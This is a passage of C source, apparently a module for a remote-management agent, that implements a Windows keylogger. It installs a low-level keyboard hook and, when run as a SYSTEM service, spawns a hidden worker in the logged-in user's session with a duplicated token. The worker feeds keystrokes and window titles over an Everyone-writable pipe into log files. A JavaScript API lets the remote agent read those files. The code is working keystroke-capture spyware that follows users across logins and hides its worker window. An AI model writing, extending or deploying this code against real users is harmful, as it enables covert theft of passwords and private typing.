    for (int tries = 0; tries < 100 && g_workerPipe == INVALID_HANDLE_VALUE; tries++)
    {
        g_workerPipe = CreateFileW(KEYLOG_PIPE_NAME, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
        if (g_workerPipe == INVALID_HANDLE_VALUE) { Sleep(100); }
    }
    if (g_workerPipe == INVALID_HANDLE_VALUE)
    {
        Keylog_Dbg("worker: pipe connect FAILED err=%lu", (unsigned long)GetLastError());
        return 2;
    }
    Keylog_Dbg("worker: started pid=%lu", (unsigned long)GetCurrentProcessId());

    hook = SetWindowsHookExW(WH_KEYBOARD_LL, Keylog_WorkerHookProc, GetModuleHandleW(NULL), 0);
    if (hook == NULL)
    {
        Keylog_Dbg("worker: SetWindowsHookEx FAILED err=%lu", (unsigned long)GetLastError());
        CloseHandle(g_workerPipe);
        return 3;
    }
    Keylog_Dbg("worker: hook installed");
    for (;;)
    {
        DWORD now = GetTickCount();
        if ((now - lastTick) >= KEYLOG_FMT_TICK_MS)
        {
            /* Flush text that has been sitting in the buffer (user stopped
             * typing for a while) so it reaches the agent promptly. */
            lastTick = now;
            KeylogEmit e[2];
            int n = Keylog_FormatTick(e);
            int i;
            for (i = 0; i < n; i++)
            {
                Keylog_WorkerSend(&e[i]);
            }
        }
        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE) != FALSE)
        {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
        Sleep(10);
    }
}

/* Tear down the worker process and the pipe. */
static void Keylog_WorkerClean(Keylog *kl)
{
    if (kl->workerProc != NULL)
    {
        if (WaitForSingleObject(kl->workerProc, 2000) != WAIT_OBJECT_0)
        {
            TerminateProcess(kl->workerProc, 0);
            WaitForSingleObject(kl->workerProc, 1000);
        }
        CloseHandle(kl->workerProc);
        kl->workerProc = NULL;
        kl->workerPid = 0;
    }
    if (kl->pipeRead != NULL)
    {
        CloseHandle(kl->pipeRead);
        kl->pipeRead = NULL;
    }
}

/* Create the pipe and spawn the worker in the console user's session.
 * Safe to call when no user is logged on: WTSQueryUserToken fails and
 * the caller simply retries later. */
static void Keylog_WorkerSpawn(Keylog *kl)
{
    wchar_t exe[1024];
    wchar_t cmd[1200];
    wchar_t wdir[KEYLOG_NAME_MAX];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    DWORD console;
    HANDLE token = NULL;
    HANDLE dup = NULL;

    Keylog_WorkerClean(kl);

    console = WTSGetActiveConsoleSessionId();
    if (WTSQueryUserToken(console, &token) == FALSE)
    {
        Keylog_Dbg("worker: WTSQueryUserToken FAILED err=%lu console=%lu",
            (unsigned long)GetLastError(), (unsigned long)console);
        return;
    }
    if (DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dup) == FALSE)
    {
        Keylog_Dbg("worker: DuplicateTokenEx FAILED err=%lu", (unsigned long)GetLastError());
        CloseHandle(token);
        return;
    }
    if (SetTokenInformation(dup, TokenSessionId, &console, sizeof(console)) == FALSE)
    {
        Keylog_Dbg("worker: SetTokenInformation FAILED err=%lu", (unsigned long)GetLastError());
    }

    /* The pipe must exist before the worker is spawned (it connects by name).
     * A pipe created by a SYSTEM service is, by default, not writable from
     * a medium-integrity user session (err=5 on the client side), so grant
     * an explicit ACE to Everyone in the DACL. */
    {
        SECURITY_ATTRIBUTES sa;
        PSECURITY_DESCRIPTOR sd = NULL;
        ZeroMemory(&sa, sizeof(sa));
        sa.nLength = sizeof(sa);
        sa.bInheritHandle = FALSE;
        if (ConvertStringSecurityDescriptorToSecurityDescriptorA(
            "D:(A;;GRGW;;;WD)(A;;GA;;;SY)(A;;GA;;;BA)", SDDL_REVISION_1, &sd, NULL) == FALSE)
        {
            Keylog_Dbg("worker: SDDL convert FAILED err=%lu", (unsigned long)GetLastError());
        }
        else
        {
            sa.lpSecurityDescriptor = sd;
        }
        kl->pipeRead = CreateNamedPipeW(KEYLOG_PIPE_NAME,
            PIPE_ACCESS_INBOUND | FILE_FLAG_FIRST_PIPE_INSTANCE,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1, 0, KEYLOG_PIPE_BUFFER, 0, &sa);
        if (kl->pipeRead == INVALID_HANDLE_VALUE)
        {
            Keylog_Dbg("worker: pipe create FAILED err=%lu", (unsigned long)GetLastError());
            kl->pipeRead = NULL;
            if (sd != NULL) { LocalFree(sd); }
            CloseHandle(dup);
            CloseHandle(token);
            return;
        }
        if (sd != NULL) { LocalFree(sd); }
    }

    if (GetModuleFileNameW(NULL, exe, 1023) <= 0)
    {
        Keylog_Dbg("worker: GetModuleFileName FAILED err=%lu", (unsigned long)GetLastError());
        goto fail;
    }
    swprintf(cmd, 1199, L"\"%s\" keylog-worker %d", exe, g_kl.windowTitles);
    Keylog_Utf8ToWide(g_kl.dir, wdir, (int)(sizeof(wdir) / sizeof(wdir[0])));

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcessAsUserW(dup, exe, cmd, NULL, NULL, FALSE, 0, NULL, wdir, &si, &pi) == FALSE)
    {
        Keylog_Dbg("worker: CreateProcessAsUser FAILED err=%lu", (unsigned long)GetLastError());
        goto fail;
    }
    CloseHandle(pi.hThread);
    kl->workerProc = pi.hProcess;
    kl->workerPid = pi.dwProcessId;
    Keylog_Dbg("worker: spawned pid=%lu console=%lu", (unsigned long)pi.dwProcessId, (unsigned long)console);

    CloseHandle(dup);
    CloseHandle(token);
    return;

fail:
    if (kl->pipeRead != NULL) { CloseHandle(kl->pipeRead); kl->pipeRead = NULL; }
    CloseHandle(dup);
    CloseHandle(token);
}

static DWORD WINAPI Keylog_ThreadProc(LPVOID param)
{
    Keylog *kl = (Keylog*)param;
    MSG msg;
    HHOOK hook;
    DWORD lastAttach = 0;
    DWORD lastSpawn = 0;
    DWORD lastTick = 0;
    DWORD sess = 0;
    int session0;

    ProcessIdToSessionId(GetCurrentProcessId(), &sess);
    session0 = (sess == 0);

    /* Attach to the interactive session's input desktop (no-op when the
     * agent already runs in an interactive session) and re-check
     * periodically so the hook follows the console through logins, logoffs
     * and user switches - the agent itself keeps running 24/7. When the
     * agent is a session 0 service this attach is not possible, so the
     * user-session worker does the capturing instead. */
    Keylog_AttachToInputDesktop();
    lastAttach = GetTickCount();
    hook = SetWindowsHookExW(WH_KEYBOARD_LL, Keylog_HookProc, GetModuleHandleW(NULL), 0);
    if (hook == NULL)
    {
        Keylog_Dbg("hook: SetWindowsHookEx FAILED err=%lu", (unsigned long)GetLastError());
    }
    else
    {
        Keylog_Dbg("hook: installed ok (agent session %lu)", (unsigned long)sess);
    }
    if (session0)
    {
        Keylog_WorkerSpawn(kl);
        lastSpawn = GetTickCount();
    }

    while (WaitForSingleObject(kl->stopEvent, 50) != WAIT_OBJECT_0)
    {
        DWORD now = GetTickCount();
        if (session0)
        {
            if (kl->workerProc == NULL)
            {
                /* No worker (logoff or not spawned yet): retry with backoff. */
                if ((now - lastSpawn) >= KEYLOG_SPAWN_RETRY_MS)
                {
                    lastSpawn = now;
                    Keylog_WorkerSpawn(kl);
                }
            }
            else if (WaitForSingleObject(kl->workerProc, 0) == WAIT_OBJECT_0)
            {
                /* Worker exited (user logged off, user switch, crash). */
                Keylog_Dbg("worker: exited, will respawn");
                CloseHandle(kl->workerProc);
                kl->workerProc = NULL;
                kl->workerPid = 0;
                if (kl->pipeRead != NULL) { CloseHandle(kl->pipeRead); kl->pipeRead = NULL; }
                lastSpawn = 0;
            }
            else if (kl->pipeRead != NULL)
            {
                DWORD avail = 0;
                if (PeekNamedPipe(kl->pipeRead, NULL, 0, NULL, &avail, NULL) == FALSE)
                {
                    if (GetLastError() == ERROR_BROKEN_PIPE)
                    {
                        Keylog_Dbg("worker: pipe broken");
                        CloseHandle(kl->pipeRead);
                        kl->pipeRead = NULL;
                    }
                }
                else if (avail >= KEYLOG_PIPE_RECORD)
                {
                    unsigned char rec[KEYLOG_PIPE_RECORD];
                    DWORD wr = 0;
                    if (ReadFile(kl->pipeRead, rec, sizeof(rec), &wr, NULL) != FALSE && wr == (DWORD)sizeof(rec))
                    {
                        unsigned short kc = (unsigned short)(rec[0] | ((unsigned short)rec[1] << 8));
                        /* Record layout: 2-byte little-endian key count,
                         * then the line text. */
                        rec[sizeof(rec) - 1] = 0;
                        if (kc != 0)
                        {
                            EnterCriticalSection(&g_kl.cs);
                            g_kl.totalKeys += kc;
                            LeaveCriticalSection(&g_kl.cs);
                        }
                        Keylog_StoreLine((const char*)(rec + 2));
                    }
                    else
                    {
                        Keylog_Dbg("worker: pipe read failed err=%lu", (unsigned long)GetLastError());
                        CloseHandle(kl->pipeRead);
                        kl->pipeRead = NULL;
                    }
                }
            }
        }
        if ((now - lastTick) >= KEYLOG_FMT_TICK_MS)
        {
            lastTick = now;
            /* Flush text that has been sitting in the buffer (idle typing)
             * so the log file and the live view stay current. */
            KeylogEmit e[2];
            int n = Keylog_FormatTick(e);
            int i;
            for (i = 0; i < n; i++)
            {
                if (e[i].keys != 0)
                {
                    EnterCriticalSection(&g_kl.cs);
                    g_kl.totalKeys += e[i].keys;
                    LeaveCriticalSection(&g_kl.cs);
                }
                Keylog_StoreLine(e[i].text);
            }
        }
        if ((now - lastAttach) >= 2000)
        {
            lastAttach = now;
            Keylog_AttachToInputDesktop();
        }
        while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE) != FALSE)
        {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }
    }
    if (hook != NULL) { UnhookWindowsHookEx(hook); }
    {
        /* Last chance to flush any pending text before the hook goes away. */
        KeylogEmit e[2];
        int n = Keylog_FormatFlushAll(e);
        int i;
        for (i = 0; i < n; i++)
        {
            if (e[i].keys != 0)
            {
                EnterCriticalSection(&g_kl.cs);
                g_kl.totalKeys += e[i].keys;
                LeaveCriticalSection(&g_kl.cs);
            }
            Keylog_StoreLine(e[i].text);
        }
    }
    Keylog_WorkerClean(kl);
    return 0;
}

/* ------------------------------------------------------------------ */
/* JavaScript API                                                      */
/* ------------------------------------------------------------------ */

static void Keylog_StopInternal(void)
{
    Keylog_EnsureInit();
    EnterCriticalSection(&g_kl.cs);
    if (g_kl.running == 0)
    {
        LeaveCriticalSection(&g_kl.cs);
        return;
    }
    SetEvent(g_kl.stopEvent);
    LeaveCriticalSection(&g_kl.cs);
    if (g_kl.thread != NULL)
    {
        WaitForSingleObject(g_kl.thread, KEYLOG_STOP_WAIT_MS);
        CloseHandle(g_kl.thread);
        g_kl.thread = NULL;
    }
    {
        /* Safety net in case the thread was killed before its own flush. */
        KeylogEmit e[2];
        int n = Keylog_FormatFlushAll(e);
        int i;
        for (i = 0; i < n; i++)
        {
            if (e[i].keys != 0)
            {
                EnterCriticalSection(&g_kl.cs);
                g_kl.totalKeys += e[i].keys;
                LeaveCriticalSection(&g_kl.cs);
            }
            Keylog_StoreLine(e[i].text);
        }
    }
    EnterCriticalSection(&g_kl.cs);
    Keylog_CloseCurrent();
    g_kl.running = 0;
    LeaveCriticalSection(&g_kl.cs);
}

static duk_ret_t Keylog_Stop(duk_context *ctx)
{
    Keylog_StopInternal();
    duk_push_true(ctx);
    return 1;
}

static duk_ret_t Keylog_Start(duk_context *ctx)
{
    char logDirBuf[KEYLOG_NAME_MAX + 1];
    int maxFileKB = 0;
    int windowTitles = 1;
    wchar_t wdir[KEYLOG_NAME_MAX];
    SYSTEMTIME st;
    DWORD threadId = 0;

    Keylog_EnsureInit();
    Keylog_StopInternal();
    Keylog_FmtReset();
    logDirBuf[0] = 0;

    if (duk_is_object(ctx, 0))
    {
        if (duk_get_prop_string(ctx, 0, "logDir") == 1)
        {
            if (duk_is_string(ctx, -1))
            {
                duk_size_t l = 0;
                const char *s = duk_get_lstring(ctx, -1, &l);
                if (l >= sizeof(logDirBuf)) { l = (duk_size_t)(sizeof(logDirBuf) - 1); }
                memcpy(logDirBuf, s, (size_t)l);
                logDirBuf[l] = 0;
            }
            duk_pop(ctx);
        }
        if (duk_get_prop_string(ctx, 0, "maxFileSizeKB") == 1)
        {
            if (duk_is_number(ctx, -1)) { maxFileKB = (int)duk_get_int(ctx, -1); }
            duk_pop(ctx);
        }
        if (duk_get_prop_string(ctx, 0, "windowTitles") == 1)
        {
            if (duk_is_boolean(ctx, -1)) { windowTitles = duk_get_boolean(ctx, -1) ? 1 : 0; }
            duk_pop(ctx);
        }
    }

    if (logDirBuf[0] == 0)
    {
        Keylog_DefaultDir(g_kl.dir, sizeof(g_kl.dir));
    }
    else
    {
        Keylog_Utf8ToWide(logDirBuf, wdir, (int)(sizeof(wdir) / sizeof(wdir[0])));
        if (GetFileAttributesW(wdir) == INVALID_FILE_ATTRIBUTES)
        {
            if (CreateDirectoryW(wdir, NULL) == FALSE && GetLastError() != ERROR_ALREADY_EXISTS)
            {
                return ILibDuktape_Error(ctx, "keylogger.start: could not create the log directory");
            }
        }
        snprintf(g_kl.dir, sizeof(g_kl.dir), "%s", logDirBuf);
    }

    if (maxFileKB > 0)
    {
        if (maxFileKB < 1024) { maxFileKB = 1024; }
        if (maxFileKB > (int)(KEYLOG_MAX_MAX_FILE / 1024)) { maxFileKB = (int)(KEYLOG_MAX_MAX_FILE / 1024); }
        g_kl.maxFileSize = (unsigned long long)maxFileKB * 1024ULL;
    }
    g_kl.windowTitles = windowTitles;

    EnterCriticalSection(&g_kl.cs);
    GetLocalTime(&st);
    snprintf(g_kl.currentDate, sizeof(g_kl.currentDate), "%04u-%02u-%02u",
        (unsigned int)st.wYear, (unsigned int)st.wMonth, (unsigned int)st.wDay);
    Keylog_CloseCurrent();
    Keylog_OpenCurrent();
    if (g_kl.current == NULL) { Keylog_SetError("Could not open the keylog file for writing"); }
    LeaveCriticalSection(&g_kl.cs);

    if (g_kl.stopEvent == NULL)
    {
        return ILibDuktape_Error(ctx, "keylogger.start: could not create the stop event");
    }
    ResetEvent(g_kl.stopEvent);
    g_kl.thread = CreateThread(NULL, 0, Keylog_ThreadProc, &g_kl, 0, &threadId);
    if (g_kl.thread == NULL)
    {
        Keylog_SetError("Could not start the keylogger hook thread");
        duk_push_false(ctx);
        return 1;
    }
    g_kl.running = 1;
    duk_push_true(ctx);
    return 1;
}

static duk_ret_t Keylog_GetState(duk_context *ctx)
{
    Keylog_EnsureInit();
    EnterCriticalSection(&g_kl.cs);
    duk_push_object(ctx);
    duk_push_boolean(ctx, 1);
    duk_put_prop_string(ctx, -2, "available");
    duk_push_boolean(ctx, g_kl.running != 0 ? 1 : 0);
    duk_put_prop_string(ctx, -2, "running");
    duk_push_number(ctx, (double)g_kl.totalKeys);
    duk_put_prop_string(ctx, -2, "totalKeys");
    duk_push_number(ctx, (double)g_kl.ringCount);
    duk_put_prop_string(ctx, -2, "bufferLines");
    duk_push_number(ctx, (double)KEYLOG_RING_LINES);
    duk_put_prop_string(ctx, -2, "bufferSize");
    duk_push_string(ctx, g_kl.dir);
    duk_put_prop_string(ctx, -2, "dir");
    duk_push_string(ctx, g_kl.currentFile);
    duk_put_prop_string(ctx, -2, "currentFile");
    duk_push_number(ctx, (double)g_kl.maxFileSize);
    duk_put_prop_string(ctx, -2, "maxFileSize");
    duk_push_string(ctx, g_kl.lastError);
    duk_put_prop_string(ctx, -2, "lastError");
    if (g_kl.workerProc != NULL && WaitForSingleObject(g_kl.workerProc, 0) != WAIT_OBJECT_0)
    {
        duk_push_number(ctx, (double)g_kl.workerPid);
    }
    else
    {
        duk_push_number(ctx, 0.0);
    }
    duk_put_prop_string(ctx, -2, "workerPid");
    LeaveCriticalSection(&g_kl.cs);
    return 1;
}

static duk_ret_t Keylog_Read(duk_context *ctx)
{
    int max = duk_get_int_default(ctx, 0, 0);
    int count;
    int i;
    Keylog_EnsureInit();
    if (max < 0) { max = 0; }
    duk_push_array(ctx);
    EnterCriticalSection(&g_kl.cs);
    count = (int)g_kl.ringCount;
    if ((max > 0) && (max < count)) { count = max; }
    for (i = 0; i < count; i++)
    {
        /* Advance the index per iteration: draining N pending lines must
         * return the N oldest lines, not N copies of the oldest one. */
        const KeylogLine *ln = &g_kl.ring[(g_kl.ringHead + (unsigned int)i) % KEYLOG_RING_LINES];
        duk_push_string(ctx, ln->text);
        duk_put_prop_index(ctx, -2, (duk_uarridx_t)i);
    }
    if (count > 0)
    {
        g_kl.ringHead = (g_kl.ringHead + (unsigned int)count) % KEYLOG_RING_LINES;
        g_kl.ringCount -= (unsigned int)count;
    }
    LeaveCriticalSection(&g_kl.cs);
    return 1;
}

static int Keylog_CompareFiles(const void *a, const void *b)
{
    const KeylogFile *fa = (const KeylogFile*)a;
    const KeylogFile *fb = (const KeylogFile*)b;
    if (fa->mtime == fb->mtime) { return 0; }
    return (fa->mtime > fb->mtime) ? -1 : 1; /* Newest first. */
}

static duk_ret_t Keylog_ListFiles(duk_context *ctx)
{
    char path[KEYLOG_PATH_MAX];
    wchar_t wpath[KEYLOG_PATH_MAX];
    WIN32_FIND_DATAW fd;
    HANDLE h;
    KeylogFile files[KEYLOG_MAX_LIST];
    int n = 0;
    int i;
    Keylog_EnsureInit();
    EnterCriticalSection(&g_kl.cs);
    snprintf(path, sizeof(path), "%s\\keylog-*.log", g_kl.dir);
    LeaveCriticalSection(&g_kl.cs);
    Keylog_Utf8ToWide(path, wpath, (int)(sizeof(wpath) / sizeof(wpath[0])));
    h = FindFirstFileW(wpath, &fd);
    duk_push_array(ctx);
    if (h == INVALID_HANDLE_VALUE) { return 1; }
    do
    {
        char name[KEYLOG_NAME_MAX];
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) { continue; }
        Keylog_WideToUtf8(fd.cFileName, name, sizeof(name));
        if (Keylog_ValidFileName(name) == 0) { continue; }
        if (n >= KEYLOG_MAX_LIST) { break; }
        snprintf(files[n].name, sizeof(files[n].name), "%s", name);
        files[n].size = ((unsigned long long)fd.nFileSizeHigh << 32) | (unsigned long long)fd.nFileSizeLow;
        files[n].mtime = Keylog_FileTimeToUtcMs(&fd.ftLastWriteTime);
        n++;
    } while (FindNextFileW(h, &fd) != FALSE);
    FindClose(h);
    if (n > 1) { qsort(files, (size_t)n, sizeof(KeylogFile), Keylog_CompareFiles); }
    for (i = 0; i < n; i++)
    {
        duk_push_object(ctx);
        duk_push_string(ctx, files[i].name);
        duk_put_prop_string(ctx, -2, "name");
        duk_push_number(ctx, (double)files[i].size);
        duk_put_prop_string(ctx, -2, "size");
        duk_push_number(ctx, (double)files[i].mtime);
        duk_put_prop_string(ctx, -2, "mtime");
        duk_put_prop_index(ctx, -2, (duk_uarridx_t)i);
    }
    return 1;
}

static const char g_b64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static void Keylog_Base64(const unsigned char *data, unsigned long long len, char *out)
{
    unsigned long long i = 0;
    unsigned long long o = 0;
    while (i + 3 <= len)
    {
        out[o++] = g_b64Table[data[i] >> 2];
        out[o++] = g_b64Table[((data[i] & 0x03) << 4) | (data[i + 1] >> 4)];
        out[o++] = g_b64Table[((data[i + 1] & 0x0F) << 2) | (data[i + 2] >> 6)];
        out[o++] = g_b64Table[data[i + 2] & 0x3F];
        i += 3;
    }
    if (i < len)
    {
        out[o++] = g_b64Table[data[i] >> 2];
        if (i + 1 < len)
        {
            out[o++] = g_b64Table[((data[i] & 0x03) << 4) | (data[i + 1] >> 4)];
            out[o++] = g_b64Table[(data[i + 1] & 0x0F) << 2];
        }
        else
        {
            out[o++] = g_b64Table[(data[i] & 0x03) << 4];
            out[o++] = '=';
        }
        out[o++] = '=';
    }
    out[o] = 0;
}

static duk_ret_t Keylog_ReadFile(duk_context *ctx)
{
    const char *name;
    duk_size_t nameLen;
    int maxBytes = duk_get_int_default(ctx, 2, 65536);
    unsigned long long offset = 0;
    char path[KEYLOG_PATH_MAX];
    FILE *f = NULL;
    unsigned char *buf = NULL;
    char *b64 = NULL;
    unsigned long long bufLen = 0;
    unsigned long long total = 0;
    unsigned long long done = 0;
    int result = 0;

    Keylog_EnsureInit();
    if (!duk_is_string(ctx, 0)) { return ILibDuktape_Error(ctx, "keylogger.readFile(name, offset, maxBytes) requires a file name"); }
    name = duk_get_lstring(ctx, 0, &nameLen);
    if (nameLen < 1 || nameLen >= KEYLOG_NAME_MAX) { return ILibDuktape_Error(ctx, "keylogger.readFile: invalid file name"); }
    {
        char tmp[KEYLOG_NAME_MAX];
        memcpy(tmp, name, nameLen);
        tmp[nameLen] = 0;
        if (Keylog_ValidFileName(tmp) == 0) { return ILibDuktape_Error(ctx, "keylogger.readFile: invalid keylog file name"); }
    }
    if (duk_is_number(ctx, 1))
    {
        double d = duk_get_number(ctx, 1);
        if (d < 0) { d = 0; }
        if (d > 0x7FFFFFFF) { d = 0x7FFFFFFF; }
        offset = (unsigned long long)d;
    }
    if (maxBytes < 4096) { maxBytes = 4096; }
    if (maxBytes > 1048576) { maxBytes = 1048576; }

    EnterCriticalSection(&g_kl.cs);
    snprintf(path, sizeof(path), "%s\\%.*s", g_kl.dir, (int)nameLen, name);
    LeaveCriticalSection(&g_kl.cs);

    f = fopen(path, "rb");
    if (f == NULL)
    {
        duk_push_object(ctx);
        duk_push_string(ctx, "");
        duk_put_prop_string(ctx, -2, "data");
        duk_push_number(ctx, 0.0);
        duk_put_prop_string(ctx, -2, "size");
        duk_push_number(ctx, (double)offset);
        duk_put_prop_string(ctx, -2, "bytes");
        duk_push_boolean(ctx, 1);
        duk_put_prop_string(ctx, -2, "done");
        duk_push_string(ctx, "not found");
        duk_put_prop_string(ctx, -2, "error");
        return 1;
    }
    fseek(f, 0, SEEK_END);
    total = (unsigned long long)ftell(f);
    fseek(f, (long)offset, SEEK_SET);
    bufLen = (offset >= total) ? 0 : ((unsigned long long)maxBytes < (total - offset) ? (unsigned long long)maxBytes : (total - offset));
    buf = (unsigned char*)malloc((size_t)bufLen + 1);
    if (buf == NULL)
    {
        fclose(f);
        return ILibDuktape_Error(ctx, "keylogger.readFile: out of memory");
    }
    if (bufLen > 0)
    {
        result = (int)fread(buf, 1, (size_t)bufLen, f);
        if (result < 0) { result = 0; }
        bufLen = (unsigned long long)result;
    }
    fclose(f);
    done = (offset + bufLen >= total) ? 1 : 0;

    b64 = (char*)malloc((size_t)((bufLen / 3 + 1) * 4 + 8));
    if (b64 == NULL)
    {
        free(buf);
        return ILibDuktape_Error(ctx, "keylogger.readFile: out of memory");
    }
    Keylog_Base64(buf, bufLen, b64);
    free(buf);

    duk_push_object(ctx);
    duk_push_string(ctx, b64);
    duk_put_prop_string(ctx, -2, "data");
    duk_push_number(ctx, (double)total);
    duk_put_prop_string(ctx, -2, "size");
    duk_push_number(ctx, (double)bufLen);
    duk_put_prop_string(ctx, -2, "bytes");
    duk_push_number(ctx, (double)offset);
    duk_put_prop_string(ctx, -2, "offset");
    duk_push_boolean(ctx, done != 0 ? 1 : 0);
    duk_put_prop_string(ctx, -2, "done");
    free(b64);
    return 1;
}

static void Keylog_Push(duk_context *ctx, void *chain)
{
    (void)chain;
    duk_push_object(ctx);
    duk_push_c_function(ctx, Keylog_Start, DUK_VARARGS);
    duk_put_prop_string(ctx, -2, "start");
    duk_push_c_function(ctx, Keylog_Stop, 0);
    duk_put_prop_string(ctx, -2, "stop");
    duk_push_c_function(ctx, Keylog_GetState, 0);
    duk_put_prop_string(ctx, -2, "getState");
    duk_push_c_function(ctx, Keylog_Read, 1);
    duk_put_prop_string(ctx, -2, "read");
    duk_push_c_function(ctx, Keylog_ListFiles, 0);
    duk_put_prop_string(ctx, -2, "listFiles");
    duk_push_c_function(ctx, Keylog_ReadFile, 3);
    duk_put_prop_string(ctx, -2, "readFile");
}

void ILibDuktape_Keylogger_Init(duk_context *ctx)
{
    ILibDuktape_ModSearch_AddHandler(ctx, "keylogger", Keylog_Push);
}

#else

/* Non-Windows stub so the module always exists in the agent. */

static duk_ret_t Keylog_StubUnsupported(duk_context *ctx)
{
    return ILibDuktape_Error(ctx, "keylogger is only available on Windows");
}

static duk_ret_t Keylog_StubGetState(duk_context *ctx)
{
    duk_push_object(ctx);
    duk_push_boolean(ctx, 1);
    duk_put_prop_string(ctx, -2, "available");
    duk_push_boolean(ctx, 0);
    duk_put_prop_string(ctx, -2, "running");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "totalKeys");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "bufferLines");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "bufferSize");
    duk_push_string(ctx, ".");
    duk_put_prop_string(ctx, -2, "dir");
    duk_push_string(ctx, "");
    duk_put_prop_string(ctx, -2, "currentFile");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "maxFileSize");
    duk_push_string(ctx, "keylogger is only available on Windows agents");
    duk_put_prop_string(ctx, -2, "lastError");
    return 1;
}

static duk_ret_t Keylog_StubEmptyArray(duk_context *ctx)
{
    duk_push_array(ctx);
    return 1;
}

static duk_ret_t Keylog_StubReadFile(duk_context *ctx)
{
    duk_push_object(ctx);
    duk_push_string(ctx, "");
    duk_put_prop_string(ctx, -2, "data");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "size");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "bytes");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "offset");
    duk_push_boolean(ctx, 1);
    duk_put_prop_string(ctx, -2, "done");
    return 1;
}

static void Keylog_Push(duk_context *ctx, void *chain)
{
    (void)chain;
    duk_push_object(ctx);
    duk_push_c_function(ctx, Keylog_StubUnsupported, DUK_VARARGS);
    duk_put_prop_string(ctx, -2, "start");
    duk_push_c_function(ctx, Keylog_StubUnsupported, DUK_VARARGS);
    duk_put_prop_string(ctx, -2, "stop");
    duk_push_c_function(ctx, Keylog_StubGetState, 0);
    duk_put_prop_string(ctx, -2, "getState");
    duk_push_c_function(ctx, Keylog_StubEmptyArray, 1);
    duk_put_prop_string(ctx, -2, "read");
    duk_push_c_function(ctx, Keylog_StubEmptyArray, 0);
    duk_put_prop_string(ctx, -2, "listFiles");
    duk_push_c_function(ctx, Keylog_StubReadFile, 3);
    duk_put_prop_string(ctx, -2, "readFile");
}

void ILibDuktape_Keylogger_Init(duk_context *ctx)
{
    ILibDuktape_ModSearch_AddHandler(ctx, "keylogger", Keylog_Push);
}

#endif
